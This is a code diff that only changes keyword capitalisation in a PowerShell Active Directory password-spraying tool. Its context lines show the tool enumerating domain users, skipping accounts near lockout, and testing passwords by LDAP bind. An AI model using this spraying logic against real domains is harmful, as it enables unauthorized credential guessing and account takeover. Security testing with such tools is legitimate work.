@@ -56,7 +56,7 @@ function Invoke-DomainPasswordSpray{
 
 
     #>
-    Param(
+    param(
 
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
@@ -84,7 +84,7 @@ function Invoke-DomainPasswordSpray{
     )
     if ($Domain -ne "")
     {
-        Try
+        try
         {
             # Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
@@ -99,7 +99,7 @@ function Invoke-DomainPasswordSpray{
     }
     else
     {
-        Try
+        try
         {
             # Trying to use the current user's domain
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -135,20 +135,20 @@ function Invoke-DomainPasswordSpray{
     }
 
     # If a single password is selected do this
-    If ($Password)
+    if ($Password)
     {
         $Passwords = @($Password)
     }
-    ElseIf($PasswordList)
+    elseif($PasswordList)
     {
         $Passwords = Get-Content $PasswordList
     }
-    Else
+    else
     {
         Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
         break
     }
-    If ($Passwords.count > 1)
+    if ($Passwords.count > 1)
     {
         Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
     }
@@ -159,7 +159,7 @@ function Invoke-DomainPasswordSpray{
     Write-Host "[*] Setting a $observation_window minute wait in between sprays."
 
     # if no force flag is set we will ask if the user is sure they want to spray
-    If (!$Force)
+    if (!$Force)
     {
         $title = "Confirm Password Spray"
         $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
@@ -174,7 +174,7 @@ function Invoke-DomainPasswordSpray{
 
         $result = $host.ui.PromptForChoice($title, $message, $options, 0)
 
-        If ($result -ne 0)
+        if ($result -ne 0)
         {
             Write-Host "Cancelling the password spray."
             break
@@ -189,7 +189,7 @@ function Invoke-DomainPasswordSpray{
         Countdown-Timer -Seconds (60*$observation_window)
     }
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-    If ($OutFile -ne "")
+    if ($OutFile -ne "")
     {
         Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
     }
@@ -197,7 +197,7 @@ function Invoke-DomainPasswordSpray{
 
 Function Countdown-Timer
 {
-    Param(
+    param(
         $Seconds = 1800,
         $Message = "[*] Pausing to avoid account lockout."
     )
@@ -254,7 +254,7 @@ Function Get-DomainUserList{
     This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"
 
     #>
-    Param(
+    param(
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
      $Domain = "",
@@ -270,7 +270,7 @@ Function Get-DomainUserList{
 
     if ($Domain -ne "")
     {
-        Try
+        try
         {
             # Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
@@ -285,7 +285,7 @@ Function Get-DomainUserList{
     }
     else
     {
-        Try
+        try
         {
             # Trying to use the current user's domain
             $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -360,7 +360,7 @@ Function Get-DomainUserList{
     $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
     $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
 
-    If ($RemoveDisabled){
+    if ($RemoveDisabled){
         Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
         # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
         # LDAP 1.2.840.113556.1.4.803 means bitwise &
@@ -380,7 +380,7 @@ Function Get-DomainUserList{
     Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
     $UserListArray = @()
 
-    If ($RemovePotentialLockouts)
+    if ($RemovePotentialLockouts)
     {
         Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
         Foreach ($user in $AllUserObjects)
@@ -436,7 +436,7 @@ function Invoke-SpraySinglePassword($CurrentDomain, $UserListArray, $Password)
 
     ForEach($User in $UserListArray){
         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
-        If ($Domain_check.name -ne $null)
+        if ($Domain_check.name -ne $null)
         {
             if ($OutFile -ne "")
             {
